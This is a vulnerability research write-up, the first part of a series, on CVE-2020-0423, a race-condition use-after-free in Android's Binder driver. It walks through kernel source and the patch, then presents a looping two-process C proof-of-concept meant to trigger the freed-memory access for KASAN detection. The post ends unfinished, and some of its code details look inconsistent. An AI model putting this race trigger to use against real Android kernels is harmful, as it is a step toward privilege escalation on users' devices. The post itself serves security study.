# CVE-2020-0423 - Part 1 - Android Research Journey

Welcome again. Last time, we fully covered the Bad Binder vulnerability, from finding (which we kind of cheated on as we had a diff), to exploiting. Now, we'll do the same for CVE-2020-0423, which is a race condition in Binder that'll make us dive even deeper into the binder internals.

Let's start and dive right into it. The CVE description reads the following:
```
In binder_release_work of binder.c, there is a possible use-after-free due to improper locking. This could lead to local escalation of privilege in the kernel with no additional execution privileges needed.
```

And let us therefore look at the diff as well. This is how the functions looked before the patch:
```c
static struct binder_work *binder_dequeue_work_head(
                    struct binder_proc *proc,
                    struct list_head *list)
{
    struct binder_work *w;

    binder_inner_proc_lock(proc);
    w = binder_dequeue_work_head_ilocked(list);
    binder_inner_proc_unlock(proc);
    return w;
}

static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;

    while (1) {
        w = binder_dequeue_work_head(proc, list);
        if (!w)
            return;

        switch (w->type) { 
		[...]
	}
	[...]
}
```

And after:
```c
static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;
    enum binder_work_type wtype;

    while (1) {
        binder_inner_proc_lock(proc);
        w = binder_dequeue_work_head_ilocked(list);
        wtype = w ? w->type : 0;
        binder_inner_proc_unlock(proc);
        if (!w)
            return;

        switch (wtype) {
		[...]
	}
	[...]
}
```


It is evident therefore, that the main difference here is the fact `wtype` is now used, instead of `w->type`, and is initialised while `proc` is *locked*. It is easily deducible then, that this is the exact source of a race condition! Let us leave this for a while and take a step back.

This is a completely new field for us, as we've not delved into `binder_release_work` so far. First of all, then, we need to understand a little bit about how `binder_work` works. Our reference is the [binder offsec blog](https://androidoffsec.withgoogle.com/posts/binder-internals/#binder-workqueues-and-work-items), which I'll briefly summarise here.

Binder uses workqueues to enable concurrency while maintaining transaction order. The workqueues are represented as a doubly linked list with only the head pointer stored (note the `list` argument above which we use to *dequeue* work).

There are a few types of workqueues in Binder:
- Main client workqueue (`binder_proc->todo`): Stores all work items assigned to a client
- Individual client thread workqueue (`binder_thread->todo`): Stores work items assigned to a specific client thread.
- Individual `binder_node` asynchronous workqueue (`binder_node->async_todo`): Stores only a list of work items that relate to asynchronous transactions (`BINDER_WORK_TRANSACTION`).

The work items are defined by `struct binder_work` (note `w` from above), which are the items of the workqueue (as noted above). The `binder_work` can be used either independently or within an object as a field. It only contains an `entry` node to be linked in a `todo` and the work type enum (`wtype`):

```c
struct binder_work {
	struct list_head entry;
	
	// because we're pre-patch, it is an anonymous enum.
	enum {
		BINDER_WORK_TRANSACTION = 1,
		BINDER_WORK_TRANSACTION_COMPLETE,
		BINDER_WORK_RETURN_ERROR,
		BINDER_WORK_NODE,
		BINDER_WORK_DEAD_BINDER,
		BINDER_WORK_DEAD_BINDER_AND_CLEAR,
		BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
	} type;
};
```

When a client performs a read operation (`BINDER_WRITE_READ`), Binder processes the next `binder_work` item [1] and translates it into the appropriate response (`BR_*`) back to userspace [2]. To retrieve the next item, it'll first check the current `binder_thread->todo` and only then the `binder_proc->todo`.

```c
static int binder_thread_read(...)
{
	while (1) {
...
		w = binder_dequeue_work_head_ilocked(list); // [1]
...
		switch (w->type) {
...
		case BINDER_WORK_TRANSACTION_COMPLETE:
		case BINDER_WORK_TRANSACTION_PENDING:
		case BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT: {
...
			if (proc->oneway_spam_detection_enabled &&
				   w->type == BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT)
				cmd = BR_ONEWAY_SPAM_SUSPECT;
			else if (w->type == BINDER_WORK_TRANSACTION_PENDING)
				cmd = BR_TRANSACTION_PENDING_FROZEN;
			else
				cmd = BR_TRANSACTION_COMPLETE;
...
			if (put_user(cmd, (uint32_t __user *)ptr)) // [2]
...
}
```

Now we understand a bit more about how `binder_work` works, but let's now dive even deeper. I want to understand the entire flow of the `binder_work` object, and its life cycle.

Let's begin with the standalone `binder_work`. It is only allocated by itself in `binder_transaction(...)`:
```c
tcomplete = kzalloc(sizeof(*tcomplete), GFP_KERNEL);
[...]
tcomplete->type = BINDER_WORK_TRANSACTION_COMPLETE;
[...]
if (reply) {
	binder_enqueue_thread_work(thread, tcomplete);
	[...]
}
```

It is then freed in `binder_thread_read(...)`, or in `binder_release_work(...)`.

There are also instances of `binder_work` in a few structures. 

Starting with `binder_transaction:
```c
struct binder_transaction {
	int debug_id;
	struct binder_work work;
	struct binder_thread *from;
	struct binder_transaction *from_parent;
	struct binder_proc *to_proc;
	struct binder_thread *to_thread;
	struct binder_transaction *to_parent;
	...
};
```

It is allocated in `binder_transaction`, and enqueued onto the target's todo:
```c
// in binder_transaction(...)
binder_enqueue_thread_work_ilocked(target_thread, &t->work);

static void
binder_enqueue_thread_work_ilocked(struct binder_thread *thread,
				   struct binder_work *work)
{
	binder_enqueue_work_ilocked(work, &thread->todo);
	thread->process_todo = true;
}
```

It is freed in two different paths that I've seen. The first is `binder_free_transaction()`, and the second is `binder_release_work()` which we've seen before. Its lifetime is from the allocation in `binder_transaction()` up until either the reply is processed and `binder_free_transaction()` is called, or when the `binder_proc` dies and `binder_release_work()` is called. 

Then, `binder_node` also contains `binder_work`:
```c
struct binder_node {
	int debug_id;
	spinlock_t lock;
	struct binder_work work;
	[...]
}
```

Which is initialised in:
```c
static struct binder_node *binder_new_node(struct binder_proc *proc,
					   struct flat_binder_object *fp)
{
	struct binder_node *node;
	struct binder_node *new_node = kzalloc(sizeof(*node), GFP_KERNEL);

	if (!new_node)
		return NULL;
	binder_inner_proc_lock(proc);
	node = binder_init_node_ilocked(proc, new_node, fp);
	binder_inner_proc_unlock(proc);
	if (node != new_node)
		/*
		 * The node was already added by another thread
		 */
		kfree(new_node);

	return node;
}
```

Which is called in:
```c
static int binder_translate_binder(struct flat_binder_object *fp,
				   struct binder_transaction *t,
				   struct binder_thread *thread)
{
	struct binder_node *node;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_ref_data rdata;
	int ret = 0;

	node = binder_get_node(proc, fp->binder);
	if (!node) {
		node = binder_new_node(proc, fp);
		if (!node)
			return -ENOMEM;
	}
	[...]

	ret = binder_inc_ref_for_node(target_proc, node,
			fp->hdr.type == BINDER_TYPE_BINDER,
			&thread->todo, &rdata);
	[...]
	binder_put_node(node);
	return ret;
}
```

Which is used in `binder_transaction()`:
```c
[...]
switch (hdr->type) {
		case BINDER_TYPE_BINDER:
		case BINDER_TYPE_WEAK_BINDER: {
			struct flat_binder_object *fp;

			fp = to_flat_binder_object(hdr);
			ret = binder_translate_binder(fp, t, thread);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			binder_alloc_copy_to_buffer(&target_proc->alloc,
						    t->buffer, object_offset,
						    fp, sizeof(*fp));
		} break;
[...]
```

The node itself is freed in `binder_free_node()` which, as we see from the `refcount` usage in `binder_translate_binder()`, is triggered when the *refcount* on the node is 0, meaning it has a *refcount based free path* alongside `binder_release_work()`. The `binder_node`, similar to other kernel objects, is freed when it has no more *refs* pointing to it. There are a few types:
1. Internal strong refs - strong references that are held by **other processes** via a `binder_ref` pointing at this node.
2. Local strong refs - strong references held by the same process.
3. Local weak refs - weak references held by the same process.
4. Temp refs - short-lived references used by Binder itself internally. 

When we look at it, it seems like the most relevant one for our usage in which we want to perform a *race condition* between free paths, the `binder_node` easily wins. It has a *concurrent* free path that is the *refcount* path. 

But even using this, how can we get a UAF with a race condition like this? Let's run a thought experiment on this. We have a `binder_node` object that has a work item in a `todo` list (has to happen to reach `binder_release_work`). The thread owns the `binder_node`, and dies in a certain moment. Now, assume we have another concurrent thread, that holds the last *ref* to that `binder_node`, and it releases it concurrently. In this case, we'll trigger the *concurrent free path*, freeing the work once with `binder_free_node()` and once with `binder_release_work()`.

Let's start with truly understanding how the *concurrent free path* works. To do so, let's first start with how `binder_free_node()` is called. This is the function:

```c
static void binder_free_node(struct binder_node *node)
{
	kfree(node);
	binder_stats_deleted(BINDER_STAT_NODE);
}
```

It is called here (multiple functions, `binder_thread_read()` excluded):
```c
static void binder_dec_node(struct binder_node *node, int strong, int internal)
{
	bool free_node;

	binder_node_inner_lock(node);
	free_node = binder_dec_node_nilocked(node, strong, internal);
	binder_node_inner_unlock(node);
	if (free_node)
		binder_free_node(node);
}

static void binder_dec_node_tmpref(struct binder_node *node)
{
	bool free_node;

	[...]
	node->tmp_refs--;
	BUG_ON(node->tmp_refs < 0);
	[...]
	free_node = binder_dec_node_nilocked(node, 0, 1);
	binder_node_inner_unlock(node);
	if (free_node)
		binder_free_node(node);
}

static void binder_free_ref(struct binder_ref *ref)
{
	if (ref->node)
		binder_free_node(ref->node);
	kfree(ref->death);
	kfree(ref);
}

static int binder_node_release(struct binder_node *node, int refs)
{
	struct binder_ref *ref;
	int death = 0;
	struct binder_proc *proc = node->proc;

	[...]
	if (hlist_empty(&node->refs) && node->tmp_refs == 1) {
		binder_inner_proc_unlock(proc);
		binder_node_unlock(node);
		binder_free_node(node);

		return refs;
	}

	[...]
	// --> This is simply a wrapper to the dec_node_tmpref.
	binder_put_node(node);

	return refs;
}
```

`binder_free_ref()` seems the most interesting, as it does not have many complicated checks, and it seems to perfectly fit our need of freeing the node from a reference (as we trigger it in another thread who does not contain the node). But, when does removing the `binder_ref` also cause a node deletion? 

`binder_free_ref()` is only called in two places: 
```c
static void binder_deferred_release(struct binder_proc *proc) { ... }
static int binder_update_ref_for_handle(struct binder_proc *proc, ...) { ... }
```

It seems that `binder_deferred_release()` simply releases the `proc` and seems less relevant to us. Let's look at `binder_update_ref_for_handle()`:
```c
static int binder_update_ref_for_handle(struct binder_proc *proc,
		uint32_t desc, bool increment, bool strong,
		struct binder_ref_data *rdata)
{
	int ret = 0;
	struct binder_ref *ref;
	bool delete_ref = false;

	binder_proc_lock(proc);
	ref = binder_get_ref_olocked(proc, desc, strong);
	[...]
	if (increment)
		ret = binder_inc_ref_olocked(ref, strong, NULL);
	else
		delete_ref = binder_dec_ref_olocked(ref, strong);

	[...]
	binder_proc_unlock(proc);
	
	// --> We need this to be true.
	if (delete_ref)
		binder_free_ref(ref);
	return ret;

	[...]
}
```

For the condition `delete_ref` to be true, we need `binder_dec_ref_olocked()` to return true:
```c
static bool binder_dec_ref_olocked(struct binder_ref *ref, int strong)
{
	if (strong) {
		if (ref->data.strong == 0) {
			binder_user_error("%d invalid dec strong, ref %d desc %d s %d w %d\n",
					  ref->proc->pid, ref->data.debug_id,
					  ref->data.desc, ref->data.strong,
					  ref->data.weak);
			return false;
		}
		ref->data.strong--;
		if (ref->data.strong == 0)
			binder_dec_node(ref->node, strong, 1);
	} else {
		if (ref->data.weak == 0) {
			binder_user_error("%d invalid dec weak, ref %d desc %d s %d w %d\n",
					  ref->proc->pid, ref->data.debug_id,
					  ref->data.desc, ref->data.strong,
					  ref->data.weak);
			return false;
		}
		ref->data.weak--;
	}
	if (ref->data.strong == 0 && ref->data.weak == 0) {
		binder_cleanup_ref_olocked(ref);
		return true;
	}
	return false;
}
```

Simple, it should happen as long we are the only thread pointing at the server (the node). In that case, our plan should simply work when we use it like so. To reiterate the flow, the vulnerability seems to be a check of `w->type` while being out of the `proc` lock. We can enter the flow of `binder_update_ref_for_handle()` in the same time, and then reacquire the lock, and free the node (thus also freeing `work`!), achieving a UAF on `work` when reading `w->type` (which later on effects what happens with `w`).

As a first step, we want to create a POC that'll demonstrate with KASAN that we can perform a UAF with what we think. Let's start by understanding the full call flow we want. We know how to reach the flow of `binder_release_work()`, but how can we reach `binder_update_ref_for_handle()`? 

First, for our use case it is wrapped in:
```c
static int binder_dec_ref_for_handle(struct binder_proc *proc,
		uint32_t desc, bool strong, struct binder_ref_data *rdata)
{
	return binder_update_ref_for_handle(proc, desc, false, strong, rdata);
}
```

It is called on a few locations, but one that looks interesting to us is:
```c
static void binder_transaction_buffer_release(struct binder_proc *proc,
					      struct binder_buffer *buffer,
					      binder_size_t failed_at,
					      bool is_failure)
{
	[...]
	off_start_offset = ALIGN(buffer->data_size, sizeof(void *));
	off_end_offset = is_failure ? failed_at :
				off_start_offset + buffer->offsets_size;
	for (buffer_offset = off_start_offset; buffer_offset < off_end_offset;
	     buffer_offset += sizeof(binder_size_t)) {
		struct binder_object_header *hdr;
		size_t object_size;
		struct binder_object object;
		binder_size_t object_offset;

		binder_alloc_copy_from_buffer(&proc->alloc, &object_offset,
					      buffer, buffer_offset,
					      sizeof(object_offset));
		object_size = binder_get_object(proc, buffer,
						object_offset, &object);
		[...]
		hdr = &object.hdr;
		switch (hdr->type) {
		[...]
		case BINDER_TYPE_HANDLE:
		case BINDER_TYPE_WEAK_HANDLE: {
			struct flat_binder_object *fp;
			struct binder_ref_data rdata;
			int ret;

			fp = to_flat_binder_object(hdr);
			
			// --> Called here!
			ret = binder_dec_ref_for_handle(proc, fp->handle,
				hdr->type == BINDER_TYPE_HANDLE, &rdata);
			[...]
		} 
		[...]
	}
	[...]
}
```

And to reach this, we need:
```c
static int binder_thread_write(struct binder_proc *proc,
			struct binder_thread *thread,
			binder_uintptr_t binder_buffer, size_t size,
			binder_size_t *consumed)
{
	uint32_t cmd;
	struct binder_context *context = proc->context;
	void __user *buffer = (void __user *)(uintptr_t)binder_buffer;
	void __user *ptr = buffer + *consumed;
	void __user *end = buffer + size;

	while (ptr < end && thread->return_error.cmd == BR_OK) {
		int ret;

		if (get_user(cmd, (uint32_t __user *)ptr))
			return -EFAULT;
		ptr += sizeof(uint32_t);
		[...]
		switch (cmd) {
		[...]
		case BC_FREE_BUFFER: {
			binder_uintptr_t data_ptr;
			struct binder_buffer *buffer;

			if (get_user(data_ptr, (binder_uintptr_t __user *)ptr))
				return -EFAULT;
			ptr += sizeof(binder_uintptr_t);

			buffer = binder_alloc_prepare_to_free(&proc->alloc,
							      data_ptr);
			[...]
			
			// --> Called here!
			binder_transaction_buffer_release(proc, buffer, 0, false);
			binder_alloc_free_buf(&proc->alloc, buffer);
			break;
		}
		[...]
	}
	return 0;
}
```
(or an error in `binder_transaction()`)

So, we simply need to `write` a command of `BC_FREE_BUFFER`, which will trigger the freeing of the `buffer`, hence also freeing the `node` itself, using the `binder_ref` we have. 

We can now begin writing the POC. This POC is a lot less trivial than the last one, especially since its a more thorough exploration in the Binder realm, but also due to it being a race with a very tight exploit window. 

The full flow of the POC as I imagine it, should be:
1. Thread/Process A initialises its binder `fd`, then becomes the context manager (this lets us easily access it with handle *0*). It then signals B.
2. Thread/Process B initialises its binder `fd`, and then sends a transaction buffer to A. When this happens, Binder creates a `binder_ref` to B's `binder_node` in A. It then signals A.
3. A then reads the buffer pointer from the transaction (crucial for us to use `BC_FREE_BUFFER` later), and then signals B.
4. Simultaneously, they are ready for the race, A triggers it via `BC_FREE_BUFFER`, while B triggers it with `close(fd)`.

from future import: *We will NOT use a thread here. I tried it, and it does not work due to the context manager receiving transactions from a node in its same `binder_proc`*.

Firstly, we should create a function to setup binder for each of the processes:
```c
int __binder_setup(void) {
  int fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
  assert(MAP_FAILED != mmap(NULL, MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0));
  return fd;
}
```

Now, we want to create a functionality to become context manager:
```c
void __become_ctx_manager(int fd) {
  uint32_t dummy = 0;
  ioctl(fd, BINDER_SET_CONTEXT_MGR, &dummy);
}
```

Following to [2], we want to send a transaction (`BINDER_TYPE_BINDER`) to the context manager to create us a `binder_node` and a `binder_ref` in the context manager to our `binder_node` (this all happens in `binder_translate_binder`):
```c
void __send_initial_transaction(int fd, int target) {
  /*
   * Create a valid binder transaction so the ctx_manager
   * holds a binder_ref to the clients binder_node.
   */
  struct flat_binder_object obj = {.hdr.type = BINDER_TYPE_BINDER,
                                   .flags = 0x7f | (1 << 8),
                                   .binder = (uintptr_t)0xdeadbeef,
                                   .cookie = 0};
  uint64_t offsets[] = {0};

  struct transaction_data data = {.cmd = BC_TRANSACTION,
                                  .tr.target.handle = target,
                                  .tr.code = 1,
                                  .tr.flags = 0,
                                  .tr.data_size = sizeof(obj),
                                  .tr.offsets_size = sizeof(offsets),
                                  .tr.data.ptr.buffer = (uintptr_t)&obj,
                                  .tr.data.ptr.offsets = (uintptr_t)offsets};

  struct binder_write_read bwr = {
      .write_size = sizeof(data),
      .write_buffer = (uintptr_t)&data,
      .read_size = 0,
  };

  ioctl(fd, BINDER_WRITE_READ, &bwr);
} 
```

We do not care for the object we pass, as we just need to reach the following flow in `binder_translate_binder()`:
```c
static int binder_translate_binder(struct flat_binder_object *fp,
				   struct binder_transaction *t,
				   struct binder_thread *thread)
{
	struct binder_node *node;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_ref_data rdata;
	int ret = 0;
	
	// --> If you can find the node buffer
	// --> return the associated node.
	// --> Otherwise, create a new node (what we want!).
	node = binder_get_node(proc, fp->binder);
	if (!node) {
		node = binder_new_node(proc, fp);
		if (!node)
			return -ENOMEM;
	}
	[...]
	
	// --> Create binder_ref to the node.
	ret = binder_inc_ref_for_node(target_proc, node,
			fp->hdr.type == BINDER_TYPE_BINDER,
			&thread->todo, &rdata);
	if (ret)
		goto done;

	[...]
	
done:
	binder_put_node(node);
	return ret;
}
```

And to ensure we're creating a `binder_ref`, let's look at `binder_inc_ref_for_node()`:

```c
static int binder_inc_ref_for_node(struct binder_proc *proc,
			struct binder_node *node,
			bool strong,
			struct list_head *target_list,
			struct binder_ref_data *rdata)
{
	struct binder_ref *ref;
	struct binder_ref *new_ref = NULL;
	int ret = 0;

	binder_proc_lock(proc);
	// --> Should not exist, thus we'll create a ref.
	ref = binder_get_ref_for_node_olocked(proc, node, NULL);
	if (!ref) {
		binder_proc_unlock(proc);
		new_ref = kzalloc(sizeof(*ref), GFP_KERNEL);
		if (!new_ref)
			return -ENOMEM;
		binder_proc_lock(proc);
		ref = binder_get_ref_for_node_olocked(proc, node, new_ref);
	}
	ret = binder_inc_ref_olocked(ref, strong, target_list);
	*rdata = ref->data;
	binder_proc_unlock(proc);
	if (new_ref && ref != new_ref)
		/*
		 * Another thread created the ref first so
		 * free the one we allocated
		 */
		kfree(new_ref);
	return ret;
}
```

Now, in order to call `BC_FREE_BUFFER` that will actually effect our node, we must provide the actual buffer that's passed. To do so, we need to parse the given buffer in the transaction from the client. We'll do it like so:
```c
uint64_t __read_buffer_from_transaction(int fd) {
  /* The client sends its data, and we need to read the
   * buffer pointer in order to pass it in BC_FREE_BUFFER
   * for the race.
   */
  uint8_t read_buf[256] = {
      0,
  };
  struct binder_write_read bwr = {.read_size = sizeof(read_buf),
                                  .read_buffer = (uintptr_t)read_buf};
  ioctl(fd, BINDER_WRITE_READ, &bwr);

  /* Parse each command, but specifically
   * find the first transaction cmd (which is what we send)
   * and extract the buffer.
   */
  uint8_t *cur = read_buf;
  uint8_t *end = read_buf + bwr.read_consumed;
  while (cur < end) {
    uint32_t cmd = *(uint32_t *)cur;
    cur += sizeof(uint32_t);
    if (cmd == BR_TRANSACTION) {
      struct binder_transaction_data *td =
          (struct binder_transaction_data *)cur;
      return td->data.ptr.buffer;
    }

    cur += _IOC_SIZE(cmd);
  }

  return NULL;
}
```

And we can afterwards free the buffer like so:
```c
void __free_buffer(int fd, uint64_t buffer_ptr) {
  uint32_t free_cmd[] = {BC_FREE_BUFFER, buffer_ptr};
  struct binder_write_read bwr = {.write_size = sizeof(free_cmd),
                                  .write_buffer = (uintptr_t)free_cmd};

  ioctl(fd, BINDER_WRITE_READ, &bwr);
}
```

Now, due to the fact we're using two different processes (as threads do not work for reasons mentioned above), we'll need to create some form of IPC synchronisation. We'll do so using pipes, for simplicity:
```c
int sync_pipe[2];

void pipe_signal(void) {
  char byte = 1;
  write(sync_pipe[1], &byte, 1);
}

void pipe_wait(void) {
  char byte;
  read(sync_pipe[0], &byte, 1);
}
```

Now, we can put it all together:
```c
void _ctx_manager_race(void) {
  __pin_to_cpu(0);

  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
  int fd = __binder_setup();
  __become_ctx_manager(fd);
  printf(INFO_PRINT "Became context manager, waiting for client...\n");

  /* Signal client to initialize itself and sync */
  pipe_signal();

  /* Read the buffer and sync to race */
  uint64_t buf_ptr = __read_buffer_from_transaction(fd);
  printf(INFO_PRINT "Read buffer from transaction: %p\n", (void *)buf_ptr);
  pipe_signal();

  /* Client is ready to race, free the buffer using binder_free_node */
  printf(INFO_PRINT "Context manager triggering race via free buffer...\n");
  __free_buffer(fd, buf_ptr);
}

void _client_race(void) {
  __pin_to_cpu(1);

  /* Initialize binder then wait to create binder_ref in ctx manager */
  printf(INFO_PRINT "Initializing client fd...\n");
  int fd = __binder_setup();
  pipe_wait();

  /* 0 for target means we send to ctx manager. */
  printf(INFO_PRINT "Sending initial transaction to create a binder_ref...\n");
  __send_initial_transaction(fd, 0);
  pipe_wait();

  /* Race: close fd → binder_deferred_release → binder_release_work */
  printf(INFO_PRINT "Client triggering race via binder_release_work...\n");
  ioctl(fd, BINDER_THREAD_EXIT, 0);
  close(fd);
}

int main(void) {
  pipe(sync_pipe);

  pid_t pid = fork();
  if (0 == pid) {
    /* Child process: context manager. */
    _ctx_manager_race();
    exit(0);
  }
  _client_race();
  wait(NULL);
}
```

Now, unfortunately, the race window is really tight, which means we need to loop a lot of times until we can get a KASAN hit. Let's introduce that change:
```c
void _ctx_manager_race(void) {
  __pin_to_cpu(0);

  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
  int fd = __binder_setup();
  __become_ctx_manager(fd);
  printf(INFO_PRINT "Became context manager, waiting for client...\n");

  /* Signal client to initialize itself and sync */
  pipe_signal();
  
  for (;;) {
    /* Read the buffer and sync to race */
    uint64_t buf_ptr = __read_buffer_from_transaction(fd);
    printf(INFO_PRINT "Read buffer from transaction: %p\n", (void *)buf_ptr);
    pipe_signal();

    /* Client is ready to race, free the buffer using binder_free_node */
    printf(INFO_PRINT "Context manager triggering race via free buffer...\n");
    __free_buffer(fd, buf_ptr);
  }
}

void _client_race(void) {
  __pin_to_cpu(1);

  /* Initialize binder then wait to create binder_ref in ctx manager */
  printf(INFO_PRINT "Initializing client fd...\n");
  int fd = __binder_setup();
  pipe_wait();
  
  for (;;) {
    int n_fd = dup(fd);
    /* 0 for target means we send to ctx manager. */
    printf(INFO_PRINT "Sending initial transaction to create a binder_ref...\n");
    __send_initial_transaction(n_fd, 0);
    pipe_wait();

    /* Race: close fd → binder_deferred_release → binder_release_work */
    printf(INFO_PRINT "Client triggering race via binder_release_work...\n");
    ioctl(n_fd, BINDER_THREAD_EXIT, 0);
    close(n_fd);
  }
}
```

Let's see if we get a *KASAN* hit:
... (WIP).